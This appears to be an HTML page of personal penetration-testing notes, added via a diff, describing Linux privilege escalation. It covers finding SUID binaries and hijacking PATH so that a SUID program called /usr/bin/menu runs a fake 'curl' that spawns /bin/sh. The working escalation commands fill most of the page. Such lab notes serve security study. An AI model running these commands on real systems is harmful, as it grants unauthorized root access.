@@ -1,0 +1,37 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Priv Escalation</title>
+</head><body><span style="font-size: 12pt"><img height="453" src="image.png" width="750"/><br/>
+<br/>
+<br/>
+<span style="font-family: Ubuntu"><div style="text-align: left">To search the a system for SUID files run the following: </div></span><ul><span style="font-family: Ubuntu"><div style="text-align: left"><li style="list-style-type: none">&gt; find / -perm -u=s -type f 2&gt;/dev/null</li>
+</div></span></ul>
+<br/>
+<b> -------------------------------------------------------------------------------------------------</b><br/>
+<b>Path</b><b>Variable</b><b>manipulation<br/>
+</b><b><br/>
+</b>Running strings command on the binary /usr/bin/menu<ul><li style="list-style-type: none">- resulted in </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">- curl -I localhost	||	uname -r	||	ifconfig	</li>
+</ul>
+</li>
+</ul>
+<ul><ul>- this means the binary is running without a full path, as it uses those commands to finish the path (otherwise it would use </ul>
+</ul>
+<div style="text-align: left"><span style="font-family: Ubuntu"><b>/usr/bin/curl</b>or <b>/usr/bin/uname</b></span></div><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">)</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">Creating environmental variable </li>
+<li style="list-style-type: none">&gt; cd /tmp					*enter tmp directory</li>
+<li style="list-style-type: none">&gt; echo /bin/sh &gt; curl			* create shell call (/bin/sh) and put it into the path curl</li>
+</ul>
+</li>
+</ul>
+<ul><ul>&gt; chmod 777 curl				* </ul>
+</ul>
+<div style="text-align: left"><span style="font-family: Roboto">Setting </span></div><b>777</b><div style="text-align: left"><span style="font-family: Roboto"> permissions to a file or directory </span></div><b>means</b><div style="text-align: left"><span style="font-family: Roboto"> that it will be readable, 								  writable and executable by all users</span></div> </span><ul><li style="list-style-type: none"><ul><span style="font-size: 12pt"><li style="list-style-type: none"/>
+<li style="list-style-type: none">&gt; export PATH=/tmp:$PATH 	*create an environental variable to establish a pth to it</li>
+<li style="list-style-type: none">&gt; usr/bin/menu				* call it and claim victory xD</li>
+</span></ul>
+</li>
+</ul>
+</body></html>
